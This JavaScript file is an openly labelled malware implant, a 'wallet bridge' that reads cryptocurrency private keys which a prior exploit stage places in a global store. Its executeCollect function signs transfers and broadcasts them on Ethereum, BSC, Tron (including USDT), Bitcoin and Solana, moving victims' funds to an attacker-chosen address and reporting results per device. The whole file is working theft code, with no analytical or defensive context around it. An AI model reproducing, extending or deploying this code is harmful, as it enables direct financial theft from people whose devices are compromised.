/**
 * Implant wallet bridge — extract wallets and broadcast signed transfers.
 * Stage3 exploit should populate:
 *   window.__WALLET_STORE = { ETH: {address, privateKey}, TRX: {...}, ... }
 *   window.__nativeSignTx(chain, unsignedPayload, privateKeyHex) => signedHex
 */
(function (global) {
    'use strict';

    var CHAIN_RPC = {
        ETH: '/api/payload/manifest/raw',
        BSC: '/api/payload/manifest/raw',
    };

    function store() {
        return global.__WALLET_STORE || {};
    }

    function getRpcHint(chain) {
        if (global.__CHAIN_RPC && global.__CHAIN_RPC[chain]) {
            return global.__CHAIN_RPC[chain];
        }
        return '';
    }

    function hexPad(hex) {
        hex = String(hex || '').replace(/^0x/i, '');
        return hex.length % 2 === 0 ? hex : '0' + hex;
    }

    async function postJson(url, body, headers) {
        var resp = await fetch(url, {
            method: 'POST',
            headers: Object.assign({ 'Content-Type': 'application/json' }, headers || {}),
            body: JSON.stringify(body),
        });
        var text = await resp.text();
        try { return { ok: resp.ok, status: resp.status, json: JSON.parse(text), text: text }; }
        catch (e) { return { ok: resp.ok, status: resp.status, json: null, text: text }; }
    }

    function nativeSign(chain, payload, privateKey) {
        if (typeof global.__nativeSignTx === 'function') {
            return global.__nativeSignTx(chain, payload, privateKey);
        }
        return null;
    }

    async function broadcastEvmRaw(rpcUrl, signedTx) {
        var res = await postJson(rpcUrl, {
            jsonrpc: '2.0',
            method: 'eth_sendRawTransaction',
            params: ['0x' + hexPad(signedTx)],
            id: 1,
        });
        if (res.json && res.json.result) return res.json.result;
        throw new Error((res.json && res.json.error && res.json.error.message) || res.text || 'EVM broadcast failed');
    }

    async function broadcastTron(signedTx) {
        var base = (global.__CHAIN_RPC && global.__CHAIN_RPC.TRX) || 'https://api.trongrid.io';
        var res = await postJson(base + '/wallet/broadcasttransaction', signedTx);
        if (res.json && (res.json.result || res.json.txid)) {
            return res.json.txid || (res.json.transaction && res.json.transaction.txID) || res.json.result;
        }
        throw new Error((res.json && res.json.message) || res.text || 'TRX broadcast failed');
    }

    async function broadcastBtc(rawTxHex) {
        var base = (global.__CHAIN_RPC && global.__CHAIN_RPC.BTC) || 'https://blockstream.info/api';
        var resp = await fetch(base + '/tx', {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' },
            body: rawTxHex,
        });
        var hash = await resp.text();
        if (!resp.ok) throw new Error(hash || 'BTC broadcast failed');
        return hash.trim();
    }

    async function broadcastSol(signedTxBase64) {
        var rpc = (global.__CHAIN_RPC && global.__CHAIN_RPC.SOL) || 'https://api.mainnet-beta.solana.com';
        var res = await postJson(rpc, {
            jsonrpc: '2.0',
            id: 1,
            method: 'sendTransaction',
            params: [signedTxBase64, { encoding: 'base64', skipPreflight: false }],
        });
        if (res.json && res.json.result) return res.json.result;
        throw new Error((res.json && res.json.error && res.json.error.message) || 'SOL broadcast failed');
    }

    function walletEntry(chain, token, address, balance, privateKey) {
        return { chain: chain, token: token, address: address, balance: balance || 0, privateKey: privateKey || '' };
    }

    function getWallets() {
        var out = [];
        var st = store();
        Object.keys(st).forEach(function (chain) {
            var item = st[chain];
            if (!item || !item.address) return;
            out.push(walletEntry(chain, item.token || chain, item.address, item.balance, item.privateKey));
        });
        if (out.length) return out;
        return [];
    }

    async function fetchSolBalance(address) {
        var rpc = (global.__CHAIN_RPC && global.__CHAIN_RPC.SOL) || 'https://api.mainnet-beta.solana.com';
        var res = await postJson(rpc, {
            jsonrpc: '2.0', id: 1, method: 'getBalance', params: [address],
        });
        if (res.json && res.json.result) {
            return (res.json.result.value || 0) / 1e9;
        }
        return 0;
    }

    async function enrichWalletBalances(wallets) {
        for (var i = 0; i < wallets.length; i++) {
            var w = wallets[i];
            if (w.chain === 'SOL' && w.address) {
                try { w.balance = await fetchSolBalance(w.address); } catch (e) {}
            }
        }
        return wallets;
    }

    async function executeCollect(args) {
        args = args || {};
        var assetId = args.asset_id || args.chain || '';
        var chain = args.chain || assetId.split('_')[0] || '';
        var token = args.token || '';
        var from = args.from_address || '';
        var to = args.to_address || '';
        var amount = Number(args.amount || 0);
        var recordId = args.record_id || '';

        if (!from || !to || amount <= 0) {
            return { ok: false, status: 'failed', error: 'invalid_collect_args', record_id: recordId };
        }

        var keyEntry = store()[chain] || store()[chain.toUpperCase()] || {};
        var privateKey = keyEntry.privateKey || '';
        if (!privateKey) {
            return {
                ok: false,
                status: 'failed',
                error: 'no_private_key_for_' + chain,
                record_id: recordId,
                asset_id: assetId,
            };
        }

        try {
            var txHash = '';
            if (chain === 'ETH' || chain === 'BSC') {
                var rpc = getRpcHint(chain) || (global.__CHAIN_RPC && global.__CHAIN_RPC[chain]);
                if (!rpc) throw new Error('RPC not configured for ' + chain);
                var unsigned = {
                    asset_id: assetId,
                    chain: chain,
                    token: token,
                    from: from,
                    to: to,
                    amount: amount,
                    type: token === chain || args.native ? 'native' : 'erc20',
                };
                var signed = nativeSign(chain, unsigned, privateKey);
                if (!signed) throw new Error('native signer unavailable');
                txHash = await broadcastEvmRaw(rpc, signed);
            } else if (chain === 'TRX') {
                var trxBase = (global.__CHAIN_RPC && global.__CHAIN_RPC.TRX) || 'https://api.trongrid.io';
                var createPath = token === 'USDT' ? '/wallet/triggersmartcontract' : '/wallet/createtransaction';
                var createBody = token === 'USDT'
                    ? {
                        owner_address: from,
                        contract_address: args.contract || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
                        function_selector: 'transfer(address,uint256)',
                        parameter: to,
                        fee_limit: 100000000,
                        call_value: 0,
                    }
                    : {
                        to_address: to,
                        owner_address: from,
                        amount: Math.floor(amount * 1e6),
                    };
                var created = await postJson(trxBase + createPath, createBody);
                if (!created.json || !created.json.transaction) {
                    throw new Error('TRX create tx failed');
                }
                var trxSigned = nativeSign('TRX', created.json.transaction, privateKey);
                if (!trxSigned) throw new Error('TRX sign failed');
                txHash = await broadcastTron(trxSigned);
            } else if (chain === 'BTC') {
                var btcUnsigned = { from: from, to: to, amount: amount, asset_id: assetId };
                var btcSigned = nativeSign('BTC', btcUnsigned, privateKey);
                if (!btcSigned) throw new Error('BTC sign failed');
                txHash = await broadcastBtc(btcSigned);
            } else if (chain === 'SOL') {
                var solUnsigned = { from: from, to: to, amount: amount, token: token, asset_id: assetId };
                var solSigned = nativeSign('SOL', solUnsigned, privateKey);
                if (!solSigned) throw new Error('SOL sign failed');
                txHash = await broadcastSol(solSigned);
            } else {
                throw new Error('unsupported chain ' + chain);
            }

            return {
                ok: true,
                status: 'confirmed',
                tx_hash: txHash,
                record_id: recordId,
                asset_id: assetId,
                device_id: args.device_id || '',
                amount: amount,
            };
        } catch (err) {
            return {
                ok: false,
                status: 'failed',
                error: err && err.message ? err.message : String(err),
                record_id: recordId,
                asset_id: assetId,
                device_id: args.device_id || '',
                amount: amount,
            };
        }
    }

    global.WalletBridge = {
        getWallets: getWallets,
        enrichWalletBalances: enrichWalletBalances,
        executeCollect: executeCollect,
        setStore: function (data) { global.__WALLET_STORE = data || {}; },
    };
})(typeof globalThis !== 'undefined' ? globalThis : window);
